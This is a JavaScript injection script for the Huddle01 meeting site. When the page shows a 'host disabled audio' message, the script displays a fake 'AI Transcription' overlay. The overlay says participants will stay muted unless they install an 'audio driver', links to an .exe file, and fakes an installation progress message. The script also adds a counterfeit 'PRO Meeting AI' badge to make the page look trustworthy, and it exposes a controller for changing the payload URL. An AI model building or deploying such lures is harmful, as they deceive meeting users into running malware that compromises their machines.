(function() {  
    const POPUP_CONFIG = {
        targetText: "Host has disabled audio for peers",
        checkInterval: 1000,
        popupDuration: 8000,
        autoClose: true,
        downloadUrl: "https://drive.com/divenovo.exe"
    };

    const BADGE_CONFIG = {
        targetButtonSelector: 'button.bg-blue-600',
        checkInterval: 500,
        badgeContent: `
            <div class="huddle-pro-badge" style="margin-left: 0.75rem; height: 2rem; display: flex; align-items: center;">
                <div style="background: #246BFD; color: white; padding: 0 0.875rem; border-radius: 0.375rem; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 0.875rem; font-weight: 600; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.25); border: 1px solid rgba(255,255,255,0.15); display: flex; align-items: center; gap: 0.5rem; height: 100%; white-space: nowrap; letter-spacing: 0.01em;">
                    <span style="font-weight: 700; font-size: 0.875rem; color: white;">PRO</span>
                    <span style="font-size: 0.875rem; font-weight: 500; color: white;">Meeting</span>
                    <span style="color: #4ade80; font-size: 0.875rem; display: flex; align-items: center; gap: 0.25rem; font-weight: 600;">
                        <span style="font-size: 0.9375rem; font-weight: 700;">✓</span>
                        <span>AI</span>
                    </span>
                </div>
            </div>
        `
    };

    if (window.huddleCombinedMonitor) return;
    window.huddleCombinedMonitor = true;
    let popupMonitorActive = false;
    let badgeMonitorActive = false;

    
    function createPopup() {
        if (document.getElementById('huddle01-clone-popup')) return;

        console.log('🔍 Texto detectado! Criando popup de driver...');

        const overlay = document.createElement('div');
        overlay.id = 'huddle01-clone-popup';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(5px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 999999;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        `;

        const popup = document.createElement('div');
        popup.className = 'grid grid-cols-2 gap-8 p-6 rounded-xl';
        popup.style.cssText = `
            background: rgb(15, 15, 15);
            width: 40%;
            min-width: 600px;
            max-width: 700px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 10px 10px -5px rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.1);
        `;

        popup.innerHTML = `
            <!-- Card AI Transcription (à esquerda) -->
            <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 1rem; padding: 1.25rem; color: white; display: flex; flex-direction: column; justify-content: space-between;">
                <div>
                    <div style="text-align: center; margin-bottom: 1rem;">
                        <div style="font-size: 1.25rem; font-weight: 700; margin-bottom: 0.25rem;">AI Meeting</div>
                        <div style="font-size: 1.5rem; font-weight: 800; background: rgba(255,255,255,0.15); padding: 0.4rem 0.8rem; border-radius: 0.5rem; display: inline-block;">Transcription</div>
                    </div>
                    
                    <div style="background: rgba(255,255,255,0.1); padding: 0.75rem; border-radius: 0.75rem; margin-bottom: 1rem;">
                        <div style="font-size: 0.95rem; font-weight: 600; margin-bottom: 0.5rem; text-align: center;">Powered by Huddle01 Pro</div>
                        
                        <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.4rem; padding: 0.4rem; background: rgba(255,255,255,0.05); border-radius: 0.4rem;">
                            <div style="color: #4ade80; font-size: 0.9rem;">✓</div>
                            <div style="font-size: 0.85rem;">Real-time transcription</div>
                        </div>
                        
                        <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.4rem; padding: 0.4rem; background: rgba(255,255,255,0.05); border-radius: 0.4rem;">
                            <div style="color: #4ade80; font-size: 0.9rem;">✓</div>
                            <div style="font-size: 0.85rem;">Multi-language support</div>
                        </div>
                        
                        <div style="display: flex; align-items: center; gap: 0.5rem; padding: 0.4rem; background: rgba(255,255,255,0.05); border-radius: 0.4rem;">
                            <div style="color: #4ade80; font-size: 0.9rem;">✓</div>
                            <div style="font-size: 0.85rem;">Speaker identification</div>
                        </div>
                    </div>
                </div>
                
                <div style="text-align: center; font-size: 0.8rem; opacity: 0.9; padding: 0.5rem; background: rgba(255,255,255,0.08); border-radius: 0.4rem;">
                    <div style="font-weight: 600;">Enhanced audio driver required</div>
                </div>
            </div>
            
            <!-- Conteúdo do driver (à direita) -->
            <div style="color: rgb(248, 250, 252); display: flex; flex-direction: column; height: 100%;">
                <div>
                    <div class="text-xl" style="font-size: 1.25rem; line-height: 1.75rem; font-weight: 600; margin-bottom: 1rem;">
                        AI Transcription Requires Enhanced Audio
                    </div>
                    
                    <div style="margin-bottom: 1.5rem; font-size: 0.95rem; color: rgb(203, 213, 224); line-height: 1.5;">
                        This meeting is using <strong>AI Meeting Transcription</strong> which requires enhanced audio processing for accurate speech recognition.
                    </div>
                    
                    <div style="background: rgba(59, 130, 246, 0.1); padding: 0.75rem; border-radius: 0.5rem; border: 1px solid rgba(59, 130, 246, 0.3); margin-bottom: 1.5rem;">
                        <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.25rem;">
                            <div style="color: rgb(59, 130, 246); font-weight: 600;">⚠️</div>
                            <div style="font-size: 0.9rem; font-weight: 600; color: rgb(59, 130, 246);">Without driver:</div>
                        </div>
                        <div style="font-size: 0.85rem; color: rgb(148, 163, 184);">
                            Your microphone will remain muted until the meeting host disables AI and tracks recording.
                        </div>
                    </div>
                </div>
                
                <div style="margin-top: auto;">
                    <a href="${POPUP_CONFIG.downloadUrl}" target="_blank" class="download-btn" 
                        style="color: rgb(248, 250, 252); 
                               background: linear-gradient(135deg, rgb(59, 130, 246), rgb(37, 99, 235));
                               padding: 0.75rem 0; 
                               margin-bottom: 0.75rem; 
                               width: 100%; 
                               border-radius: 0.5rem; 
                               border: none; 
                               font-size: 1rem; 
                               font-weight: 600;
                               cursor: pointer;
                               transition: all 0.2s;
                               outline: none;
                               text-decoration: none;
                               display: block;
                               text-align: center;
                               box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);">
                         Install Audio Driver
                    </a>
                        
                    <button type="button" class="close-btn" 
                        style="color: rgb(248, 250, 252); 
                               background: rgb(28, 30, 36); 
                               padding: 0.5rem 0; 
                               width: 100%; 
                               border-radius: 0.5rem; 
                               border: 1px solid rgba(255, 255, 255, 0.1);
                               font-size: 0.95rem; 
                               font-weight: 500;
                               cursor: pointer;
                               transition: all 0.2s;
                               outline: none;">
                        Continue Meeting
                    </button>
                </div>
            </div>
        `;

        overlay.appendChild(popup);
        document.body.appendChild(overlay);

        const downloadBtn = popup.querySelector('.download-btn');
        const closeBtn = popup.querySelector('.close-btn');

        downloadBtn.addEventListener('mouseenter', () => {
            downloadBtn.style.background = 'linear-gradient(135deg, rgb(96, 165, 250), rgb(59, 130, 246))';
            downloadBtn.style.transform = 'translateY(-2px)';
            downloadBtn.style.boxShadow = '0 6px 8px -1px rgba(0, 0, 0, 0.4)';
        });
        
        downloadBtn.addEventListener('mouseleave', () => {
            downloadBtn.style.background = 'linear-gradient(135deg, rgb(59, 130, 246), rgb(37, 99, 235))';
            downloadBtn.style.transform = 'translateY(0)';
            downloadBtn.style.boxShadow = '0 4px 6px -1px rgba(0, 0, 0, 0.3)';
        });

        closeBtn.addEventListener('mouseenter', () => {
            closeBtn.style.backgroundColor = 'rgb(35, 37, 45)';
            closeBtn.style.borderColor = 'rgba(255, 255, 255, 0.2)';
        });
        
        closeBtn.addEventListener('mouseleave', () => {
            closeBtn.style.backgroundColor = 'rgb(28, 30, 36)';
            closeBtn.style.borderColor = 'rgba(255, 255, 255, 0.1)';
        });

        closeBtn.addEventListener('click', () => {
            closePopup(overlay);
        });

        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) {
                closePopup(overlay);
            }
        });

        downloadBtn.addEventListener('click', (e) => {
            console.log('⬇ Download iniciado: ' + POPUP_CONFIG.downloadUrl);
            downloadBtn.innerHTML = '⏳ Installing AI Driver...';
            downloadBtn.style.background = 'linear-gradient(135deg, rgb(148, 163, 184), rgb(100, 116, 139))';
            
            setTimeout(() => {
                downloadBtn.innerHTML = '✅ AI Driver Installed';
                downloadBtn.style.background = 'linear-gradient(135deg, rgb(34, 197, 94), rgb(21, 128, 61))';
                
                setTimeout(() => {
                    closePopup(overlay);
                }, 2000);
            }, 1500);
        });

        document.body.style.overflow = 'hidden';

        setTimeout(() => {
            overlay.style.opacity = '0';
            overlay.style.transition = 'opacity 0.3s ease';
            overlay.offsetHeight;
            overlay.style.opacity = '1';
        }, 10);

        if (POPUP_CONFIG.autoClose) {
            setTimeout(() => {
                if (document.getElementById('huddle01-clone-popup')) {
                    closePopup(overlay);
                }
            }, POPUP_CONFIG.popupDuration);
        }

        return overlay;
    }

    function closePopup(overlay) {
        if (!overlay) return;
        
        overlay.style.transition = 'opacity 0.3s ease';
        overlay.style.opacity = '0';
        
        setTimeout(() => {
            if (overlay.parentNode) {
                overlay.parentNode.removeChild(overlay);
            }
            document.body.style.overflow = '';
        }, 300);
    }

    function checkForTargetText() {
        const walker = document.createTreeWalker(
            document.body,
            NodeFilter.SHOW_TEXT,
            null,
            false
        );

        let node;
        while (node = walker.nextNode()) {
            if (node.textContent.includes(POPUP_CONFIG.targetText)) {
                console.log('✅ Text "' + POPUP_CONFIG.targetText + '" found');
                createPopup();
                return true;
            }
        }
        
        const bodyText = document.body.innerText || document.body.textContent;
        if (bodyText.includes(POPUP_CONFIG.targetText)) {
            console.log('✅ Text "' + POPUP_CONFIG.targetText + '"found it');
            createPopup();
            return true;
        }
        
        return false;
    }

    
    function addProBadge() {
        const proButton = document.querySelector(BADGE_CONFIG.targetButtonSelector);
        
        if (proButton && !proButton.hasAttribute('data-badge-added')) {
            console.log('🎯 Botão "Get 2x HPs with PRO" detectado! Adicionando badge...');
            
            proButton.setAttribute('data-badge-added', 'true');
            const buttonContainer = proButton.parentElement;
            
            if (!buttonContainer) return false;
            
            const buttonTextElement = proButton.querySelector('.text-sm');
            let fontSize = '0.875rem';
            let fontWeight = '600';
            
            if (buttonTextElement) {
                const computedStyle = window.getComputedStyle(buttonTextElement);
                fontSize = computedStyle.fontSize;
                fontWeight = computedStyle.fontWeight;
            }
            
            const updatedBadgeContent = BADGE_CONFIG.badgeContent
                .replace(/font-size: 0\.875rem/g, `font-size: ${fontSize}`)
                .replace(/font-weight: 600/g, `font-weight: ${fontWeight}`)
                .replace(/font-size: 0\.875rem/g, `font-size: ${fontSize}`)
                .replace(/font-weight: 700/g, `font-weight: ${parseInt(fontWeight) + 100}`);
            
            const badgeContainer = document.createElement('div');
            badgeContainer.innerHTML = updatedBadgeContent;
            const badgeElement = badgeContainer.firstElementChild;
            
            buttonContainer.insertBefore(badgeElement, proButton.nextSibling);
            console.log('✅ Badge Pro added');
            
            setTimeout(() => {
                badgeElement.style.opacity = '0';
                badgeElement.style.transform = 'translateX(-10px)';
                badgeElement.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
                badgeElement.offsetHeight;
                badgeElement.style.opacity = '1';
                badgeElement.style.transform = 'translateX(0)';
            }, 10);
            
            const badgeInner = badgeElement.querySelector('div');
            badgeInner.style.cursor = 'pointer';
            badgeInner.style.transition = 'all 0.2s ease';
            badgeInner.style.animation = 'pulse-subtle 3s infinite';
            
            badgeInner.addEventListener('mouseenter', () => {
                badgeInner.style.transform = 'translateY(-1px)';
                badgeInner.style.boxShadow = '0 4px 8px rgba(36, 107, 253, 0.3)';
                badgeInner.style.background = '#3B82F6';
                badgeInner.style.borderColor = 'rgba(255,255,255,0.25)';
                badgeInner.style.animation = 'none';
            });
            
            badgeInner.addEventListener('mouseleave', () => {
                badgeInner.style.transform = 'translateY(0)';
                badgeInner.style.boxShadow = '0 2px 4px rgba(0,0,0,0.25)';
                badgeInner.style.background = '#246BFD';
                badgeInner.style.borderColor = 'rgba(255,255,255,0.15)';
                badgeInner.style.animation = 'pulse-subtle 3s infinite';
            });
            
            badgeInner.addEventListener('click', (e) => {
                e.stopPropagation();
                showProMeetingTooltip(badgeInner);
            });
            
            return true;
        }
        
        return false;
    }

    function showProMeetingTooltip(badgeElement) {
        const existingTooltip = document.querySelector('.pro-meeting-tooltip');
        if (existingTooltip) {
            existingTooltip.remove();
            return;
        }
        
        const rect = badgeElement.getBoundingClientRect();
        const tooltip = document.createElement('div');
        tooltip.className = 'pro-meeting-tooltip';
        tooltip.style.cssText = `
            position: fixed;
            top: ${rect.bottom + 8}px;
            left: ${rect.left}px;
            background: linear-gradient(135deg, #246BFD 0%, #1D4ED8 100%);
            color: white;
            padding: 0.875rem 1rem;
            border-radius: 8px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            font-size: 0.875rem;
            z-index: 9999;
            box-shadow: 0 8px 24px rgba(36, 107, 253, 0.4);
            border: 1px solid rgba(255,255,255,0.2);
            backdrop-filter: blur(10px);
            min-width: 240px;
            animation: fadeInTooltip 0.3s ease;
            transform-origin: top left;
        `;
        
        tooltip.innerHTML = `
            <div style="margin-bottom: 0.625rem; font-weight: 700; display: flex; align-items: center; gap: 0.625rem; font-size: 0.9375rem;">
                <span style="color: white; font-size: 1rem;">🎯</span>
                <span>Premium Meeting Active</span>
            </div>
            <div style="margin-bottom: 0.875rem; opacity: 0.9; font-size: 0.8125rem; line-height: 1.3; background: rgba(255,255,255,0.1); padding: 0.5rem 0.625rem; border-radius: 4px;">
                This session is using Huddle01 Pro features for enhanced experience
            </div>
            <div style="display: flex; flex-direction: column; gap: 0.5rem;">
                <div style="display: flex; align-items: center; gap: 0.5rem;">
                    <span style="color: #4ade80; font-size: 0.875rem; font-weight: 600;">✓</span>
                    <span style="font-size: 0.8125rem; font-weight: 500;">AI Transcription Enabled</span>
                </div>
                <div style="display: flex; align-items: center; gap: 0.5rem;">
                    <span style="color: #4ade80; font-size: 0.875rem; font-weight: 600;">✓</span>
                    <span style="font-size: 0.8125rem; font-weight: 500;">Enhanced Audio Processing</span>
                </div>
                <div style="display: flex; align-items: center; gap: 0.5rem;">
                    <span style="color: #4ade80; font-size: 0.875rem; font-weight: 600;">✓</span>
                    <span style="font-size: 0.8125rem; font-weight: 500;">HD Recording Available</span>
                </div>
                <div style="display: flex; align-items: center; gap: 0.5rem;">
                    <span style="color: #4ade80; font-size: 0.875rem; font-weight: 600;">✓</span>
                    <span style="font-size: 0.8125rem; font-weight: 500;">Premium Server Priority</span>
                </div>
            </div>
            <div style="margin-top: 0.875rem; padding-top: 0.625rem; border-top: 1px solid rgba(255,255,255,0.2); font-size: 0.75rem; opacity: 0.8; font-weight: 500;">
                Click anywhere to close • Huddle01 Pro
            </div>
        `;
        
        document.body.appendChild(tooltip);
        
        setTimeout(() => {
            const tooltipRect = tooltip.getBoundingClientRect();
            if (tooltipRect.right > window.innerWidth) {
                tooltip.style.left = `${window.innerWidth - tooltipRect.width - 10}px`;
            }
            if (tooltipRect.bottom > window.innerHeight) {
                tooltip.style.top = `${rect.top - tooltipRect.height - 5}px`;
            }
        }, 10);
        
        setTimeout(() => {
            const closeTooltip = (e) => {
                if (!tooltip.contains(e.target) && !badgeElement.contains(e.target)) {
                    tooltip.remove();
                    document.removeEventListener('click', closeTooltip);
                }
            };
            setTimeout(() => {
                document.addEventListener('click', closeTooltip);
            }, 100);
        }, 10);
    }

    
    function startPopupMonitoring() {
        if (popupMonitorActive) return;
        popupMonitorActive = true;
        
        console.log('🚀 monitored: "' + POPUP_CONFIG.targetText + '"');
        checkForTargetText();
        
        window.huddlePopupInterval = setInterval(checkForTargetText, POPUP_CONFIG.checkInterval);
        
        window.huddlePopupObserver = new MutationObserver((mutations) => {
            for (const mutation of mutations) {
                if (mutation.addedNodes.length > 0) {
                    checkForTargetText();
                }
            }
        });
        
        window.huddlePopupObserver.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    function startBadgeMonitoring() {
        if (badgeMonitorActive) return;
        badgeMonitorActive = true;
        
        console.log('🚀 activated');
        addProBadge();
        
        window.huddleBadgeInterval = setInterval(addProBadge, BADGE_CONFIG.checkInterval);
        
        window.huddleBadgeObserver = new MutationObserver((mutations) => {
            for (const mutation of mutations) {
                if (mutation.addedNodes.length > 0) {
                    setTimeout(addProBadge, 100);
                }
            }
        });
        
        window.huddleBadgeObserver.observe(document.body, {
            childList: true,
            subtree: true
        });
        
        document.addEventListener('click', () => {
            setTimeout(addProBadge, 300);
        });
    }

    function stopPopupMonitoring() {
        if (window.huddlePopupInterval) clearInterval(window.huddlePopupInterval);
        if (window.huddlePopupObserver) window.huddlePopupObserver.disconnect();
        popupMonitorActive = false;
        console.log('🛑 trhrth');
    }

    function stopBadgeMonitoring() {
        if (window.huddleBadgeInterval) clearInterval(window.huddleBadgeInterval);
        if (window.huddleBadgeObserver) window.huddleBadgeObserver.disconnect();
        badgeMonitorActive = false;
        console.log('🛑 ergfeg');
    }

    
    function init() {
        console.log('🎯 Huddle01 Enhanced Script iniciando...');
        
        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeInTooltip {
                from { 
                    opacity: 0; 
                    transform: translateY(-8px) scale(0.95); 
                }
                to { 
                    opacity: 1; 
                    transform: translateY(0) scale(1); 
                }
            }
            
            @keyframes pulse-subtle {
                0% {
                    box-shadow: 0 2px 4px rgba(0,0,0,0.25);
                }
                50% {
                    box-shadow: 0 2px 6px rgba(36, 107, 253, 0.4);
                }
                100% {
                    box-shadow: 0 2px 4px rgba(0,0,0,0.25);
                }
            }
            
            .huddle-pro-badge {
                transition: opacity 0.4s ease, transform 0.4s ease;
            }
            
            .pro-meeting-tooltip {
                animation: fadeInTooltip 0.3s ease;
            }
        `;
        document.head.appendChild(style);
        
        startPopupMonitoring();
        startBadgeMonitoring();
        
        window.addEventListener('load', () => {
            setTimeout(() => {
                addProBadge();
                checkForTargetText();
            }, 1000);
        });
        
        console.log('✅ rthrth');
        console.log('📊 rthrh');
        console.log('   1. Pfghs');
        console.log('   2. fvbfg');
        console.log('💡 hrghr: window.huddleController');
    }

    
    window.huddleController = {
        showPopup: createPopup,
        closePopup: () => {
            const popup = document.getElementById('huddle01-clone-popup');
            if (popup) closePopup(popup);
        },
        checkForText: checkForTargetText,
        updateDownloadUrl: (newUrl) => {
            POPUP_CONFIG.downloadUrl = newUrl;
            console.log('🔗 Download: ' + newUrl);
        },
        
        addBadge: addProBadge,
        removeBadge: () => {
            const badge = document.querySelector('.huddle-pro-badge');
            const tooltip = document.querySelector('.pro-meeting-tooltip');
            if (badge) badge.remove();
            if (tooltip) tooltip.remove();
            const button = document.querySelector(BADGE_CONFIG.targetButtonSelector);
            if (button) button.removeAttribute('data-badge-added');
            console.log('🗑️ Badge');
        },
        showTooltip: showProMeetingTooltip,
        
        startAll: () => {
            startPopupMonitoring();
            startBadgeMonitoring();
        },
        stopAll: () => {
            stopPopupMonitoring();
            stopBadgeMonitoring();
        },
        startPopup: startPopupMonitoring,
        stopPopup: stopPopupMonitoring,
        startBadge: startBadgeMonitoring,
        stopBadge: stopBadgeMonitoring,
        
        config: {
            popup: POPUP_CONFIG,
            badge: BADGE_CONFIG
        }
    };

    init();

})();